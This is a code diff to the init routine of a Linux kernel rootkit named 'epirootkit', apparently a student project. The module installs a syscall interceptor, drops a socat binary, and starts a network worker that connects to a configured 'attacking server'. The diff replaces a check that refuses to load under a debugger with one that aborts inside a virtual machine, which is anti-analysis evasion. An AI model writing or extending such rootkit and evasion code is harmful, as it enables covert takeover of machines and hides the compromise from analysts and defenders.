@@ -1,5 +1,6 @@
 #include "epirootkit.h"
 #include "init.h"
+#include "vanish.h"
 
 char *ip = SERVER_IP;
 int port = SERVER_PORT;
@@ -20,26 +21,26 @@ MODULE_PARM_DESC(message, "Message to send to the attacking server");
  * error code if the kernel thread fails to start.
  */
 static int __init epirootkit_init(void) {
-    DBG_MSG("epirootkit: epirootkit_init: trying to load module...\n");
+    DBG_MSG("epirootkit_init: trying to load module...\n");
 
-    // Check if the module is being loaded by a traced process
-    if (current->ptrace & (PT_PTRACED | PT_SEIZED)) {
-        ERR_MSG("epirootkit: epirootkit_init: sorry bro, process loading me is being traced. Aborting load...\n");
-        return -EPERM;
+    if (VANISH && is_running_in_virtual_env())
+    {
+        ERR_MSG("epirootkit_init: nooope, you should not pass\n");
+        return -FAILURE;
     }
 
     if (init_interceptor() != SUCCESS) {
-        ERR_MSG("epirootkit: epirootkit_init: failed to init interceptor\n");
+        ERR_MSG("epirootkit_init: failed to init interceptor\n");
         return -FAILURE;
     }
 
     if (drop_socat_binaire() != SUCCESS) {
-        ERR_MSG("epirootkit: epirootkit_init: failed to drop socat binary\n");
+        ERR_MSG("epirootkit_init: failed to drop socat binary\n");
         return -FAILURE;
     }
 
     if (start_network_worker() != SUCCESS) {
-        ERR_MSG("epirootkit: epirootkit_init: failed to start network worker\n");
+        ERR_MSG("epirootkit_init: failed to start network worker\n");
         return -FAILURE;
     }
 
@@ -48,7 +49,7 @@ static int __init epirootkit_init(void) {
         return -FAILURE;
     }
 
-    DBG_MSG("epirootkit: epirootkit_init: module loaded... (/^▽^)/\n");
+    DBG_MSG("epirootkit_init: module loaded... (/^▽^)/\n");
     return SUCCESS;
 }
 
@@ -65,7 +66,7 @@ static void __exit epirootkit_exit(void) {
     exit_interceptor();
     close_worker_socket();
 
-    DBG_MSG("epirootkit: epirootkit_exit: module unloaded (/^▽^)/\n");
+    DBG_MSG("epirootkit_exit: module unloaded (/^▽^)/\n");
 }
 
 module_init(epirootkit_init);
